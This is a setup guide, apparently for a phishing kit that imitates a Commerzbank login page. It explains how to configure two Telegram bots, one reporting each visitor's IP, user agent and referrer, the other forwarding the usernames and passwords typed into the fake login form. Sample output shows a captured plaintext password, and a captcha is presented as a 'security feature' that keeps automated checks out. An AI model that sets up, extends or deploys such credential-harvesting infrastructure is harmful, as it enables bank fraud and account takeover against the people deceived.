# Telegram Bot Setup Instructions

## 🔧 Setup Required

To enable Telegram notifications, you need to configure two Telegram bots:

### Step 1: Create Telegram Bots

1. **Open Telegram** and search for `@BotFather`
2. **Send** `/newbot` to create your first bot
3. **Follow instructions** to name your bot (e.g., "Visitor Notifications")
4. **Save the bot token** (looks like: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)
5. **Repeat** for second bot (e.g., "Form Submissions")

### Step 2: Get Your Chat ID

1. **Start a chat** with your bot
2. **Send any message** to the bot
3. **Visit** `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
4. **Find your chat ID** in the response (looks like: `123456789`)

### Step 3: Configure the Application

1. **Edit** `commerzbank/config/telegram.php`
2. **Replace** the placeholder values:

```php
// Bot 1 - Visitor notifications
$telegram_bot1_token = 'YOUR_BOT1_TOKEN_HERE';  // Replace with actual token
$telegram_bot1_chat_id = 'YOUR_CHAT_ID_HERE';   // Replace with actual chat ID

// Bot 2 - Form submission notifications  
$telegram_bot2_token = 'YOUR_BOT2_TOKEN_HERE';  // Replace with actual token
$telegram_bot2_chat_id = 'YOUR_CHAT_ID_HERE';   // Replace with actual chat ID
```

### Step 4: Test the Setup

1. **Visit** your homepage
2. **Check** if you receive visitor notification in Bot 1
3. **Submit** the login form
4. **Check** if you receive form data notification in Bot 2

## 📱 What You'll Receive

### Bot 1 - Visitor Notifications
```
🔔 Neuer Besucher auf der Homepage

🌐 IP: 192.168.1.100
🕒 Zeit: 2025-08-26 22:40:15
🌍 User Agent: Mozilla/5.0...
🔗 Referer: https://google.com
```

### Bot 2 - Form Submissions
```
📝 Neue Anmeldedaten erhalten!

👤 Benutzername: testuser123
🔐 Passwort: mypassword123
🌐 IP: 192.168.1.100
🕒 Zeit: 2025-08-26 22:40:20
🌍 User Agent: Mozilla/5.0...
```

## 🔒 Security Features

- **Captcha Protection**: German math questions prevent automated submissions
- **IP Tracking**: All visitor IPs are logged and sent via Telegram
- **User Agent Tracking**: Browser information is captured
- **Timestamp**: Exact time of visit and form submission

## ⚠️ Important Notes

- **Keep bot tokens secret** - don't share them publicly
- **Test thoroughly** before going live
- **Monitor** your Telegram chats for notifications
- **Backup** your configuration file

## 🚀 Ready to Use

Once configured, your homepage will:
1. ✅ Send visitor notifications to Bot 1
2. ✅ Send form submissions to Bot 2  
3. ✅ Require captcha verification
4. ✅ Track all visitor data
5. ✅ Log everything to files and Telegram

